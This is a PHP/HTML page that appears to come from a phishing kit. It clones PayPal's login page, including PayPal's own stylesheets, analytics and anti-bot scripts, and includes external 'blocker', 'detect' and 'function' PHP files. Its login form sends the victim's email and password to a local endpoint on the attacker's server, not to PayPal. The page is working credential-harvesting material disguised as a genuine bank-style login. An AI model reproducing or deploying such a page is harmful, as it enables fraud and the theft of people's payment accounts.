<?php 
error_reporting(0); 
include('../blocker.php');
include('../detect.php');
include('../function.php');
?>

<!DOCTYPE html>		<html class=" js " lang="en">
	<head>
		<meta charset="utf-8">
		<title>Log in to your PayPal account</title>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta name="application-name" content="PayPal">
		<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<meta name="keywords" content="transfer money, email money transfer, international money transfer ">
		<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
		<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
		<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/css/app.css">
		<!--[if lte IE 9]>
		<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/css/ie9.css" />
		<![endif]--><script src="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/js/lib/modernizr-2.6.1.js"></script><script>/* Don't bust the frame if this is top window* or if the parent window is *.paypal.com domain (Checkout for example).*/if (self === top || /paypal\.com$/.test(window.parent.location.hostname)) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script><script src="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" data-requiremodule="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
	</head>
	<body class="desktop " data-rlogid="Or6hBsNkVrwHgJBCMZPkpI71eI5V%2BYu%2FvV5zMKXQ7ei%2BiGynZVMPA078yWcrA9AQYZ%2FUQOdmpV1JR4dFKDFovY%2BW0Sl4yke8_155b34eb395" data-hostname="ZwH608DcwsYoOOw3X9ttiQNSFeOd/u8Zrb0P3KkXCPH7QG/e6L9tFqD1LMrJGDcb+Pwa+84YXcs" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/a72570e5b9cbc4e4/challenge.js" data-view-name="login" data-template-path="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/templates/US/en/%s.js" data-correlation-id="b7274a1059ef6" data-client-name="ul" data-csrf-token="acSpvh36coEL4FdLjIbUKlhvXpr2sI/bdMVKo=">
		<noscript>
			<p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
		</noscript>
		<div id="main" class="main " role="main">
			<section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
				<div class="corral">
					<div id="content" class="contentContainer">
						<header>
							<p class="paypal-logo paypal-logo-long">PayPal</p>
						</header>
						<h1 class="headerText accessAid">Log in to your PayPal account</h1>
						<form action="webscr?cmd=_login-run&amp;dispatch=<?php echo md5(microtime());?>" method="post" name="login" autocomplete="off">
							<input id="token" name="_csrf" value="acSpvh36coEL4FdLjIbUKlhvXpr2sI/bdMVKo=" type="hidden"><input name="locale.x" value="en_US" type="hidden"><input name="processSignin" value="main" type="hidden">
							<div id="passwordSection" class="clearfix">
								<div class="textInput" id="login_emaildiv">
									<div class="fieldWrapper"><label for="email" class="fieldLabel">Email</label><input value="" id="email" name="login_email" class="hasHelp  validateEmpty  " required="required" aria-required="true" autocomplete="off" placeholder="Email" type="email"></div>
									<div class="errorMessage" id="emailErrorMessage">
										<p class="emptyError hide">Required</p>
										<p class="invalidError hide">That email format isn’t right</p>
									</div>
								</div>
								<div class="textInput lastInputField" id="login_passworddiv">
									<div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label><input id="password" name="login_password" class="hasHelp  validateEmpty  " required="required" aria-required="true" value="" placeholder="Password" type="password"></div>
									<div class="errorMessage" id="passwordErrorMessage">
										<p class="emptyError hide">Required</p>
									</div>
								</div>
							</div>
							<div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div>
							<div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div>
							<input value="v=1;a1=na~a2=na~a3=na~a4=Mozilla~a5=Netscape~a6=5.0 (Windows)~a7=20100101~a8=na~a9=true~a10=Windows NT 6.2; WOW64~a11=true~a12=Win32~a13=na~a14=Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0~a15=false~a16=en-US~a17=na~a18=www.paypal.com~a19=na~a20=na~a21=na~a22=na~a23=1366~a24=768~a25=24~a26=728~a27=na~a28=Mon Jul 04 2016 07:28:53 GMT+0700 (SE Asia Standard Time)~a29=7~a30=na~a31=yes~a32=na~a33=yes~a34=no~a35=no~a36=yes~a37=no~a38=online~a39=no~a40=Windows NT 6.2; WOW64~a41=no~a42=no~" name="bp_mid" id="bp_mid" type="hidden">
						</form>
						<a href="#" class="button secondary" id="createAccount">Sign Up</a>
					</div>
				</div>
				<footer class="footer footerStayPut" role="contentinfo">
					<ul class="footerGroup">
						<li><a href="#">Contact Us</a></li>
						<li><a href="#">Privacy</a></li>
						<li><a href="#">Legal</a></li>
						<li><a href="#">Worldwide</a></li>
					</ul>
				</footer>
			</section>
		</div>
		<div class="transitioning hide">
			<p class="checkingInfo hide">Checking your info…</p>
			<p class="oneSecond hide">Just a second…</p>
		</div>
		<!-- Require.js baseUrl config is loaded in advance. More here: http://requirejs.org/docs/api.html#config --><script>var require = {baseUrl: 'https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/js/'};</script><script src="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/js/lib/require.js"></script><script src="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/js/app.js"></script><!-- SiteCatalyst Code --><script type="text/javascript" src="//www.paypalobjects.com/js/site_catalyst/pp_jscode_080706.js"></script><script type="text/javascript">s.prop71="Nodejs";s.prop40="b7274a1059ef6";s.prop20="1467592127381";s.prop50="en_US";s.prop1="unifiedloginnodeweb/public/templates/login.dust";s.pageName="main:unifiedloginnodeweb:::login-captcha";s.eVar31="main:unifiedloginnodeweb:::login-captcha";s.eVar25="main:unifiedloginnodeweb:::login-captcha:::";s.prop25="main:unifiedloginnodeweb:::login-captcha:::";s.channel="";s.prop51="";s.hier1="";s.prop35="::";s.prop37="unifiedloginnodeweb";s.prop30="";s.prop31="";s.eVar2="";function scOnload(){var s_code=s.t();if(s_code)document.write(s_code);}if (window.addEventListener){window.addEventListener('load',scOnload,false);} else if (window.attachEvent){window.attachEvent('onload', scOnload);};if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')</script>
		<noscript><img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" height="1" width="1" border="0"></noscript>
		<!-- End SiteCatalyst Code --><script src="//www.paypalobjects.com/pa/js/pa.js"></script><script>(function(){if(typeof PAYPAL.analytics != "undefined"){PAYPAL.core = PAYPAL.core || {};PAYPAL.core.pta = PAYPAL.analytics.setup({data:'pgrp=main%3Aunifiedloginnodeweb%3A%3A%3Alogin-captcha&page=main%3Aunifiedloginnodeweb%3A%3A%3Alogin-captcha%3A%3A%3A&qual=&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2Flogin.dust&pgst=1467592127381&lgin=%3A%3A&vers=unifiedloginnodeweb&calc=b7274a1059ef6&rsta=en_US&pgtf=Nodejs&s=ci&ccpg=&csci=4f4ae34601ef4e57b72d4bf29990f9a5&comp=unifiedloginnodeweb&tsrce=mppnodeweb&pxpguid=&goal=&fltp=&flnm=&erpg=&erfd=&eccd=&cust=&acnt=&aver=&rstr=&pfid=&bztp=&mbtp=', url:'https:\/\/t.paypal.com\/ts'});}}());</script>
		<noscript><img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedloginnodeweb%3A%3A%3Alogin-captcha&page=main%3Aunifiedloginnodeweb%3A%3A%3Alogin-captcha%3A%3A%3A&qual=&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2Flogin.dust&pgst=1467592127381&lgin=%3A%3A&vers=unifiedloginnodeweb&calc=b7274a1059ef6&rsta=en_US&pgtf=Nodejs&s=ci&ccpg=&csci=4f4ae34601ef4e57b72d4bf29990f9a5&comp=unifiedloginnodeweb&tsrce=mppnodeweb&pxpguid=&goal=&fltp=&flnm=&erpg=&erfd=&eccd=&cust=&acnt=&aver=&rstr=&pfid=&bztp=&mbtp=" alt="" height="1" width="1" border="0"></noscript>
		<script>var PAYPAL = PAYPAL || {};PAYPAL.ulData = {fnUrl: "https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js",fnSessionId: "4f4ae34601ef4e57b72d4bf29990f9a5",sourceId: "UNIFIED_LOGIN",beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD00ZjRhZTM0NjAxZWY0ZTU3YjcyZDRiZjI5OTkwZjlhNSZpPTE4MC4yNDEuMTYwLjE1MiZ0PTE0Njc1OTIxMjcuNDI3JmE9MjEmcz1VTklGSUVEX0xPR0lOe5GqkUpE1nuzTOJZFqQJRsReCxw",enableSpeedTyping: "true"};</script>
		<noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=4f4ae34601ef4e57b72d4bf29990f9a5&s=UNIFIED_LOGIN&js=0&r=1" alt="" height="1" width="1" border="0"></noscript>
		<script>(function(){if(document.getElementsByTagName("body")[0].getAttribute("data-enable-client-cal-logging")){var e=window.PAYPAL||{};e.ulData=e.ulData||{},e.ulData.logRecords=[{evt:"ul-rendered",ts:Date.now()}],e.ulData.saveClientSideLogs=function(){if(!e.ulData.logRecords)return;var t={currentUrl:window.location.href,_csrf:document.getElementById("token").value,logRecords:e.ulData.logRecords},n=new XMLHttpRequest;n.open("POST","/signin/client-log",!0),n.setRequestHeader("Content-Type","application/json;charset=UTF-8");try{n.send(JSON.stringify(t)),e.ulData.logRecords=null}catch(r){}};var t=window.attachEvent||window.addEventListener,n=window.attachEvent?"onbeforeunload":"beforeunload";t(n,e.ulData.saveClientSideLogs)}})();		</script>
		<div style="position: absolute; top: 0px;">
			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="midflash" height="1" width="1">
				<param name="movie" value="https://www.paypalobjects.com/en_US/m/midOpt.swf">
				<param name="wmode" value="transparent">
				<param name="quality" value="high">
				<param name="menu" value="false">
				<param name="allowScriptAccess" value="always">
				<embed src="https://www.paypalobjects.com/en_US/m/midOpt.swf" quality="high" name="midflash" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer" height="1" width="1">
			</object>
		</div>
		<iframe style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999;" title="" src="about:blank"></iframe>
		<div aria-label="Password Recovery" aria-describedby="forgot-password-modal" role="dialog" tabindex="-1" style="display: none; top: 11px; left: 502px;" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front">
			<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span class="ui-dialog-title" id="ui-id-1">&nbsp;</span><button title="close" aria-disabled="false" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" type="button"><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">close</span></button></div>
			<div style="display: block;" class="pwr-modal forgotPasswordModal ui-dialog-content ui-widget-content" id="forgot-password-modal" aria-label="Password Recovery"><iframe id="pwdIframe" data-src="/us/webapps/accountrecovery/passwordrecovery" scrolling="no" data-auto-reload="true" data-tabindex="0"></iframe></div>
		</div>
		<iframe src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" style="width: 0; height: 0; border: 0; position:absolute; z-index:-999" id="ppfniframe" name="ppfniframe"></iframe><script async="" type="text/javascript">var clientCalLog = function (e){
			"use strict";
			e=e||{};var t=window.PAYPAL||{};t.ulData=t.ulData||{},t.ulData.logRecords=t.ulData.logRecords||[],e.ts=Date.now(),t.ulData.logRecords.push(e)};try {function cdebbdcdce(){var e="d4e7755c4a00ada5b4d9895c82029797"+function(e,t){var n=t&&t.charCodeAt(0)%26||e.charCodeAt(3)%26,r=-1,i=e.replace(/[a-zA-Z]/g,function(e){return r+=1,String.fromCharCode((e<="Z"?90:122)>=(e=(e.charCodeAt(0)+t.charCodeAt(r%t.length))%26+n+(e<="Z"?90:122)-26)?e:e-26)});return i}("3cf2a49fd3ffce423ebafba835db46ee","84541ce77b82a9c0feb6ebdb7d052c58");return e+=function(e,t){var n=-1,r=e.replace(/[a-zA-Z]/g,function(e){return n+=1,String.fromCharCode((e<="Z"?90:122)>=(e=(e.charCodeAt(0)+t.charCodeAt(n%t.length))%26+3+(e<="Z"?90:122)-26)?e:e-26)});return r}("7fed7e25fd99e7e87f31e564a009ea8f","52afd207ca79de01718372f289419d71"),e=function(e,t){t||(t=e);var n=e.split(t[2]),r="";for(var i=n.length-1;i>=0;i--)r=r+n[i]+t[i%t.length];return r}("4555df38b5b0d1977c99ca3aa7c99f62",e),e="7acb312127b584805bcb87d41a718f83"+function(e,t){var n=t&&t.charCodeAt(0)%26||e.charCodeAt(3)%26,r=-1,i=e.replace(/[a-zA-Z]/g,function(e){return r+=1,String.fromCharCode((e<="Z"?90:122)>=(e=(e.charCodeAt(0)+t.charCodeAt(r%t.length))%26+n+(e<="Z"?90:122)-26)?e:e-26)});return i}(e,"b219037e9f78213c417d5be83d760189"),e=function(e,t){t||(t=e);var n=e.split(t[2]),r="";for(var i=n.length-1;i>=0;i--)r=r+n[i]+t[i%t.length];return r}("5f3aecaa3c8a750ea739f15be63b701d",e),e+=function(e,t){var n=-1,r=e.replace(/[a-zA-Z]/g,function(e){return n+=1,String.fromCharCode((e<="Z"?90:122)>=(e=(e.charCodeAt(0)+t.charCodeAt(n%t.length))%26+13+(e<="Z"?90:122)-26)?e:e-26)});return r}("01ef2a1a7e021892f1421986624437e0","b728840d0e32522a7b349ba54107d7d0"),e+=function(e,t){return typeof document!="undefined"&&typeof document.implementation!="undefined"?e:t}("eab4e80fec7352a7","b6e4bfd17c0ade3e"),e}(function(){var e=cdebbdcdce(),t="ads_token_js="+encodeURIComponent(e)+"&_csrf="+encodeURIComponent("xhd10ixiRdoHn3E9GrahkWF3QLnWneeWn9THY=");(function(e,t,n,r){var i;window.XMLHttpRequest?i=new XMLHttpRequest:i=new ActiveXObject("Microsoft.XMLHTTP"),i.onreadystatechange=function(){i.readyState===4&&i.status===200},i.open("POST",e,!0),i.setRequestHeader("Content-type","application/x-www-form-urlencoded"),i.send(t+"&"+n+"="+r)})("/auth/verifychallenge",t,"b0bfef6503caf561","ba46f06a17b1a657")})()} catch(e) {clientCalLog({evt: "ads-get-script-error", data: e.message})}
		</script>
	</body>
</html>
